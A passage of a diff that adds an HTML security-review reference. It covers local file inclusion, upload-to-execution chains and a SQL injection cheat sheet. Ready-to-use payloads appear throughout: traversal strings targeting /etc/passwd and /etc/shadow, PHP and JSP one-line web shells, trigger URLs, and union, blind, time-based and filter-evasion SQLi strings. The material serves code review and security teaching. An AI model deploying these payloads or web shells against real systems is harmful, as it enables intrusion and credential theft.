+<li>.NET: <code>File.ReadAllText</code>, <code>File.OpenRead</code>, <code>Path.Combine</code>, <code>PhysicalFileProvider</code>, <code>IWebHostEnvironment</code></li>
+<li>If user input feeds the file path, inspect immediately</li>
+</ul>
+</section>
+<section>
+<h3>12.3. High-Value File Targets</h3>
+<ul>
+<li><code>/etc/passwd</code></li>
+<li><code>/etc/shadow</code></li>
+<li><code>/etc/hosts</code></li>
+<li><code>/etc/apache2/sites-enabled/*</code></li>
+<li><code>/etc/nginx/*</code></li>
+<li><code>C:\Windows\win.ini</code></li>
+<li><code>C:\Windows\System32\drivers\etc\hosts</code></li>
+<li><code>config.php</code>, <code>settings.php</code>, <code>database.php</code>, <code>.env</code></li>
+<li><code>wp-config.php</code>, <code>application.properties</code>, <code>application.yml</code>, <code>web.config</code>, <code>appsettings.json</code></li>
+<li><code>uploads/</code>, <code>tmp/</code>, <code>cache/</code>, <code>logs/</code>, <code>sessions/</code></li>
+</ul>
+</section>
+<section>
+<h3>12.4. File Upload Abuse</h3>
+<ul>
+<li>upload endpoints accept <code>file</code>, <code>upload</code>, <code>attachment</code>, <code>import</code>, <code>avatar</code>, <code>image</code>, <code>document</code></li>
+<li><code>$_FILES</code>, <code>Request.Form.Files</code>, <code>MultipartFile</code>, <code>req.files</code>, <code>multer</code>, <code>FileStream</code>, <code>transferTo</code></li>
+<li>file names: <code>filename</code>, <code>name</code>, <code>tmp_name</code>, <code>originalname</code>, <code>path</code>, <code>upload_dir</code></li>
+<li>extension abuse: <code>.php</code>, <code>.phtml</code>, <code>.jsp</code>, <code>.aspx</code>, <code>.html</code>, <code>.js</code>, <code>.svg</code>, <code>.xml</code>, <code>.jspx</code>, <code>.war</code>, <code>.sh</code>, <code>.py</code></li>
+<li>content-type abuse: <code>image/png</code>, <code>text/html</code>, <code>application/x-php</code>, <code>text/plain</code>, <code>application/octet-stream</code></li>
+<li>path traversal via <code>../</code>, encoded traversal, or upload dir + user-chosen filename</li>
+</ul>
+</section>
+<section>
+<h3>12.5. Upload + Execution Chains</h3>
+<ul>
+<li>upload file → store under web root → access via browser → execute code</li>
+<li>upload file → later included by app → code executes from plugin/theme/config path</li>
+<li>upload file → later processed by app as template / script / config file</li>
+<li>upload file → shell or script is run by backend functions or cron job later</li>
+<li>common chain: <code>upload -&gt; save -&gt; include/execute -&gt; code execution</code></li>
+</ul>
+</section>
+<section>
+<h3>12.6. Very Common Upload + Execution Patterns</h3>
+<ul>
+<li>PHP: <code>move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $target)</code> then <code>include($target)</code> or <code>file_get_contents($target)</code></li>
+<li>PHP: <code>file_put_contents($uploadDir . $_FILES[&#x27;file&#x27;][&#x27;name&#x27;], $data)</code> then browser hits the file</li>
+<li>Node: <code>fs.writeFile</code> / <code>writeFileSync</code> to web root, then request serves the file or it is imported / executed later</li>
+<li>Java: <code>FileOutputStream</code> / <code>transferTo</code> to upload dir, then file is served or run as JSP / JSPX / WAR / script</li>
+<li>.NET: <code>File.WriteAllBytes</code>, <code>Request.Form.Files</code>, then file is served / interpreted / loaded by app</li>
+</ul>
+</section>
+<section>
+<h3>12.7. Execution Sinks After Upload</h3>
+<ul>
+<li>PHP: <code>exec</code>, <code>system</code>, <code>shell_exec</code>, <code>passthru</code>, <code>popen</code>, <code>proc_open</code>, <code>include</code>, <code>require</code>, <code>assert</code>, <code>eval</code></li>
+<li>Node: <code>child_process.exec</code>, <code>spawn</code>, <code>fork</code>, <code>vm</code>, <code>Function</code>, <code>require</code>, <code>import()</code></li>
+<li>Java: <code>Runtime.exec</code>, <code>ProcessBuilder</code>, <code>ScriptEngine</code>, <code>Class.forName</code>, <code>ELProcessor</code></li>
+<li>.NET: <code>Process.Start</code>, <code>Assembly.Load</code>, <code>Activator.CreateInstance</code>, <code>MethodInfo.Invoke</code></li>
+<li>If uploaded content can be executed or included, treat it as a direct RCE vector</li>
+</ul>
+</section>
+<section>
+<h3>12.8. Web Shell Patterns</h3>
+<p>- <code>&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</code> - <code>&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;</code> - <code>&lt;script&gt;fetch(&#x27;/?cmd=...&#x27;)&lt;/script&gt;</code> - <code>powershell -enc ...</code> - shell script with <code>bash -c</code> or <code>python -c</code></p>
+<ul>
+<li><code>.php</code>, <code>.phtml</code>, <code>.php5</code>, <code>.php7</code>, <code>.phar</code>, <code>.jsp</code>, <code>.jspx</code>, <code>.aspx</code>, <code>.ashx</code>, <code>.cshtml</code>, <code>.html</code>, <code>.js</code>, <code>.mjs</code>, <code>.sh</code>, <code>.py</code></li>
+<li>typical payloads:</li>
+<li>web shell only matters if it is reachable and the app will execute or serve it</li>
+</ul>
+</section>
+<section>
+<h3>12.9. File Inclusion + Upload Combos</h3>
+<ul>
+<li>upload script writes file under web root and <code>include</code>/<code>require</code> later reads it</li>
+<li>upload script writes to config directory and app loads it on next request</li>
+<li>plugin/theme upload uses included code path; uploaded package runs after activation</li>
+<li>template or language file upload is later rendered or included as part of app localization or theming</li>
+<li>archive upload extracts to a web-serving directory; extracted files are then invoked</li>
+</ul>
+</section>
+<section>
+<h3>12.10. Traversal / Bypass Patterns</h3>
+<ul>
+<li><code>../../etc/passwd</code></li>
+<li><code>..\..\windows\win.ini</code></li>
+<li><code>../../../var/www/html/config.php</code></li>
+<li><code>%2e%2e%2fetc/passwd</code></li>
+<li><code>%2e%2e%5cwindows\win.ini</code></li>
+<li><code>..%2f..%2f..%2fetc/passwd</code></li>
+<li><code>..//..//..//etc/passwd</code></li>
+<li>double-encoded traversal: <code>%252e%252e%252f</code></li>
+<li><code>path.normalize</code> or <code>basename</code> by themselves are not real fixes without root enforcement</li>
+</ul>
+</section>
+<section>
+<h3>12.11. Useful Search Terms</h3>
+<ul>
+<li><code>include|require|readfile|file_get_contents|fopen|glob|opendir</code></li>
+<li><code>move_uploaded_file|$_FILES|upload|tmp_name|originalname|multipart|transferTo</code></li>
+<li><code>file_put_contents|fwrite|rename|copy|writeFile|writeFileSync</code></li>
+<li><code>exec|system|shell_exec|passthru|proc_open|Process.Start|Runtime.exec</code></li>
+<li><code>..\/|%2e%2e|../|upload|web shell|shell.php</code></li>
+</ul>
+</section>
+<section>
+<h3>12.12. Quick Review Rule</h3>
+<ul>
+<li>Start with the file path the app opens or includes.</li>
+<li>Then check whether user input reaches it.</li>
+<li>Then check whether the file is writable by the app or uploadable by a user.</li>
+<li>Then check whether the file is later executed, rendered, or included.</li>
+<li>If file content is reachable from the web or code path, treat it as high value.</li>
+</ul>
+</section>
+<section>
+<h3>12.13. Quick Payloads</h3>
+<h4>Traversal / LFI</h4>
+<ul>
+<li><code>../../etc/passwd</code></li>
+<li><code>../../config.php</code></li>
+<li><code>../../../var/www/html/index.php</code></li>
+<li><code>..\..\windows\win.ini</code></li>
+<li><code>%2e%2e%2fetc/passwd</code></li>
+</ul>
+<h4>Upload / Web Shell</h4>
+<ul>
+<li><code>&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</code></li>
+<li><code>&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]); ?&gt;</code></li>
+<li><code>&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;</code></li>
+<li><code>&lt;script&gt;fetch(&#x27;/?cmd=...&#x27;)&lt;/script&gt;</code></li>
+</ul>
+<h4>Execution Triggers</h4>
+<ul>
+<li><code>?file=../../etc/passwd</code></li>
+<li><code>?page=../../wp-config.php</code></li>
+<li><code>?template=../uploads/webshell.php</code></li>
+<li><code>?cmd=id</code></li>
+</ul>
+</section>
+<section>
+<h3>12.14. Final Rule</h3>
+<ul>
+<li>LFI is often just the first step.</li>
+<li>If an uploaded or included file can be executed, it becomes direct code execution.</li>
+<li>Treat upload + include / execution as one of the highest-value chains in a web app.</li>
+</ul>
+</section>
+</details>
+<details open>
+<summary id="sql-injection-cheat-sheet"><h2>13. SQL Injection Cheat Sheet</h2></summary>
+<section>
+<h3>Scope</h3>
+<ul>
+<li>SQL injection review and exploitation reference for union, error, blind, time-based, enumeration, and evasion techniques</li>
+<li>Use after tracing input to a real SQL sink rather than as a replacement for source review.</li>
+</ul>
+</section>
+<section>
+<h3>13.1. SQLi Checklist</h3>
+<ul>
+<li>User input reaches <code>SELECT</code>, <code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code>, <code>ORDER BY</code>, <code>LIMIT</code>, <code>OFFSET</code>, <code>HAVING</code>, <code>WHERE</code></li>
+<li>Input is concatenated into SQL string or interpolated into raw query text</li>
+<li>Query is built from request parameters, cookies, headers, body, file data, JSON, or server state</li>
+<li>DB layer is raw SQL, ORM raw SQL, or string-built query builder</li>
+<li>Authentication, search, filtering, sort, pagination, exports all matter</li>
+</ul>
+</section>
+<section>
+<h3>13.2. Basic Payloads</h3>
+<ul>
+<li><code>&#x27; OR &#x27;1&#x27;=&#x27;1</code></li>
+<li><code>&quot; OR &quot;1&quot;=&quot;1</code></li>
+<li><code>admin&#x27; --</code></li>
+<li><code>admin&#x27; #</code></li>
+<li><code>&#x27;) OR 1=1 --</code></li>
+<li><code>UNION SELECT NULL--</code></li>
+<li><code>UNION SELECT NULL,NULL--</code></li>
+<li><code>ORDER BY 1--</code></li>
+<li><code>ORDER BY 1,2,3--</code></li>
+<li><code>LIMIT 1,1--</code></li>
+<li><code>OFFSET 1--</code></li>
+<li><code>OR 1=1--</code></li>
+<li><code>AND 1=1--</code></li>
+<li><code>AND 1=2--</code></li>
+</ul>
+</section>
+<section>
+<h3>13.3. Common Injection Points</h3>
+<ul>
+<li><code>WHERE username = &#x27;$user&#x27;</code></li>
+<li><code>WHERE id = $id</code></li>
+<li><code>ORDER BY $sort</code></li>
+<li><code>LIMIT $limit</code></li>
+<li><code>OFFSET $offset</code></li>
+<li><code>HAVING $filter</code></li>
+<li><code>SELECT ... FROM ... WHERE ...</code></li>
+<li>dynamic SQL in DAO / repository / mapper code</li>
+<li>Raw query builders: <code>raw()</code>, <code>execute()</code>, <code>query()</code>, <code>SELECT</code>, <code>FROM</code>, <code>WHERE</code></li>
+</ul>
+</section>
+<section>
+<h3>13.4. Comment Syntax by DB</h3>
+<ul>
+<li>MySQL / MariaDB: <code>-- </code>, <code>#</code>, <code>/* */</code></li>
+<li>PostgreSQL: <code>-- </code>, <code>/* */</code></li>
+<li>MSSQL: <code>-- </code>, <code>/* */</code></li>
+<li>Oracle: <code>-- </code>, <code>/* */</code></li>
+<li>SQLite: <code>-- </code>, <code>/* */</code></li>
+<li>If one form fails, try another comment style or inline syntax variant</li>
+</ul>
+</section>
+<section>
+<h3>13.5. Union-Based SQLi</h3>
+<ul>
+<li><code>UNION SELECT NULL--</code></li>
+<li><code>UNION SELECT NULL,NULL--</code></li>
+<li><code>UNION SELECT 1,2,3--</code></li>
+<li><code>UNION ALL SELECT 1,2,3--</code></li>
+<li><code>UNION SELECT username,password FROM users--</code></li>
+<li><code>UNION SELECT version(),database(),user()--</code></li>
+<li>Use <code>ORDER BY</code> to find the right column count</li>
+<li>Need output reflected in the response to be useful</li>
+</ul>
+</section>
+<section>
+<h3>13.6. Error-Based SQLi</h3>
+<ul>
+<li><code>&#x27; OR 1=1--</code></li>
+<li><code>OR 1=cast(database() as int)--</code></li>
+<li><code>AND 1=(SELECT 1 FROM dual)--</code> (DB-specific)</li>
+<li><code>UNION SELECT @@version--</code></li>
+<li><code>UNION SELECT USER()--</code></li>
+<li><code>UNION SELECT current_database()--</code></li>
+<li>Useful when the application echoes SQL errors or DB exceptions</li>
+</ul>
+</section>
+<section>
+<h3>13.7. Blind SQLi</h3>
+<ul>
+<li><code>AND 1=1--</code></li>
+<li><code>AND 1=2--</code></li>
+<li><code>AND SUBSTRING((SELECT version()),1,1)= &#x27;5&#x27;--</code></li>
+<li><code>AND ASCII(SUBSTRING((SELECT database()),1,1))&gt;64--</code></li>
+<li><code>AND (SELECT COUNT(*) FROM users)&gt;0--</code></li>
+<li><code>OR 1=1--</code></li>
+<li>Good for boolean conditions, time delays, and response differences</li>
+</ul>
+</section>
+<section>
+<h3>13.8. Time-Based SQLi</h3>
+<ul>
+<li>MySQL: <code>AND SLEEP(5)--</code></li>
+<li>PostgreSQL: <code>AND pg_sleep(5)--</code></li>
+<li>MSSQL: <code>WAITFOR DELAY &#x27;0:0:05&#x27;--</code></li>
+<li>Oracle: <code>DBMS_LOCK.SLEEP(5)--</code></li>
+<li>Use when there is no visible SQL output but the response timing changes</li>
+</ul>
+</section>
+<section>
+<h3>13.9. Boolean / Response-Based Checks</h3>
+<ul>
+<li><code>AND 1=1</code></li>
+<li><code>AND 1=2</code></li>
+<li><code>OR 1=1</code></li>
+<li><code>&#x27; OR &#x27;1&#x27;=&#x27;1</code></li>
+<li><code>&#x27; OR &#x27;x&#x27;=&#x27;y</code> </li>
+<li>Differences in page content, errors, login success, or redirect behavior often reveal injection</li>
+</ul>
+</section>
+<section>
+<h3>13.10. Common DB Enumeration</h3>
+<ul>
+<li>MySQL: <code>SELECT version(), database(), user()</code></li>
+<li>PostgreSQL: <code>SELECT version(), current_database(), current_user</code></li>
+<li>MSSQL: <code>SELECT @@version, DB_NAME(), SUSER_SNAME()</code></li>
+<li>Oracle: <code>SELECT banner FROM v$version</code></li>
+<li><code>SELECT table_name FROM information_schema.tables--</code></li>
+<li><code>SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27;--</code></li>
+<li><code>SELECT username,password FROM users--</code></li>
+</ul>
+</section>
+<section>
+<h3>13.11. DB-Specific Notes</h3>
+<ul>
+<li>MySQL: <code>information_schema</code>, <code>users</code>, <code>mysql.user</code>, <code>@@version</code>, <code>database()</code>, <code>sleep()</code></li>
+<li>PostgreSQL: <code>information_schema</code>, <code>pg_catalog</code>, <code>current_database()</code>, <code>current_user</code>, <code>pg_sleep()</code></li>
+<li>MSSQL: <code>sys.objects</code>, <code>sys.columns</code>, <code>INFORMATION_SCHEMA</code>, <code>@@version</code>, <code>WAITFOR DELAY</code></li>
+<li>Oracle: <code>ALL_TABLES</code>, <code>ALL_TAB_COLUMNS</code>, <code>v$version</code>, <code>DBMS_LOCK.SLEEP</code></li>
+<li>SQLite: <code>sqlite_master</code>, <code>pragma_table_info</code>, <code>sqlite_version()</code></li>
+</ul>
+</section>
+<section>
+<h3>13.12. Filter Evasion</h3>
+<ul>
+<li>URL encoding: <code>%27</code>, <code>%22</code>, <code>%23</code>, <code>%2d%2d</code></li>
+<li>double encoding: <code>%2527</code></li>
+<li>whitespace tricks: newline, tab, carriage return, comments</li>
+<li><code>/**/</code> instead of space</li>
+<li>case changes: <code>OR</code>, <code>or</code>, <code>Or</code></li>
+<li>string truncation / aliasing / comments when the app normalizes input</li>
+</ul>
+</section>
+<section>
+<h3>13.13. SQLi in Different Query Shapes</h3>
+<ul>
+<li>login form: <code>username</code> / <code>password</code></li>
+<li>search: <code>q</code>, <code>search</code>, <code>keyword</code>, <code>term</code></li>
+<li>sort: <code>sort</code>, <code>order</code>, <code>orderby</code>, <code>field</code>, <code>direction</code></li>
+<li>pagination: <code>page</code>, <code>limit</code>, <code>offset</code>, <code>start</code>, <code>rows</code></li>
+<li>filter: <code>category</code>, <code>status</code>, <code>id</code>, <code>user</code>, <code>role</code></li>
+<li>if user input reaches a raw SQL string in any of these, test it</li>
+</ul>
+</section>
+<section>
+<h3>13.14. Typical High-Value Patterns</h3>
+<ul>
+<li><code>SELECT * FROM users WHERE username = &#x27;...&#x27;;</code></li>
+<li><code>SELECT * FROM products WHERE category = &#x27;...&#x27; ORDER BY ...</code></li>
+<li><code>SELECT * FROM invoices WHERE id = ... LIMIT ...</code></li>
+<li><code>INSERT INTO users (username,password) VALUES (&#x27;...&#x27;)</code></li>
+<li><code>UPDATE users SET password=&#x27;...&#x27; WHERE id=...</code></li>
+<li><code>DELETE FROM users WHERE id=...</code></li>
+<li>If the app builds SQL dynamically, assume raw input may be dangerous until proven otherwise</li>
+</ul>
+</section>
+<section>
+<h3>13.15. Quick Review Rule</h3>
+<ul>
+<li>Start with the SQL sink, not with payloads.</li>
+<li>Trace request data backward.</li>
+<li>Check whether the query is parameterized / safe.</li>
+<li>If raw SQL is present, test for boolean, union, time, or error-based injection.</li>
+<li>If it never reaches a raw SQL sink, it is not SQLi.</li>
+</ul>
+</section>
+<section>
+<h3>13.16. Useful Search Terms</h3>
+<ul>
+<li><code>SELECT|INSERT|UPDATE|DELETE|ORDER BY|LIMIT|OFFSET|HAVING|UNION</code></li>
+<li><code>query\(|execute\(|raw\(|prepare\(|statement|mysqli|PDO|sql</code></li>
+<li><code>WHERE .*\$|WHERE .*request|filter|sort|page|offset|id</code></li>
+<li><code>sqlalchemy|jdbc|preparedstatement|executeQuery|ExecuteReader</code></li>
+</ul>
+</section>
+<section>
+<h3>13.18. Final Rule</h3>
+<ul>
+<li>SQLi is usually not a random payload problem; it is a raw SQL construction problem.</li>
+<li>If you find user input in a SQL string, test it.</li>
+<li>If you find parameterized queries or safe ORMs, move on unless there is a raw path or custom SQL builder.</li>
+</ul>
+</section>
+</details>
+</article>
+</main>
+</body>
+</html>
